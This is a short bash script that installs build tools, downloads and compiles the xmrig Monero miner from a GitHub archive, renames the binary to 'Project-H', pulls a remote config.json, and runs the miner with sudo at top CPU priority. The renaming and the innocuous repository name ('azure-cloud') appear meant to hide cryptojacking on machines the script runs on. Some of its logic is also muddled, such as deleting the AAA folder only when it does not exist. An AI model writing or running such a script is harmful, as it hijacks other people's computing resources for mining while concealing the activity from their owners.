#!/bin/bash
export TZ=America/Sao_Paulo
export LOCAL=$(cat $(find /home -name home.file))
cd $LOCAL
if [ ! -e "AAA/build/Project-H" ]; then

   if [ ! -e "AAA" ]; then
      sudo rm -rf AAA
   fi

   sudo apt-get update
   sudo apt-get --assume-yes install build-essential cmake libuv1-dev libssl-dev libhwloc-dev git unzip
   wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip
   unzip AAA.zip
   rm -rf AAA.zip
   cd AAA
   mkdir build
   cd build
   cmake ..
   make
   mv xmrig Project-H
   wget https://raw.githubusercontent.com/U117A/scripts/master/config.json
else
   cd AAA/build
   if [ -e "config.json" ]; then
      rm -rf config.json
      wget https://raw.githubusercontent.com/U117A/scripts/master/config.json
   fi
fi
user=$(cat home.file)
${user/'/home/'}
sed -i 's/"worker-id":.*/"worker-id": ${user/'/home/'},/' config.json
sudo nice -n -20 ./Project-H
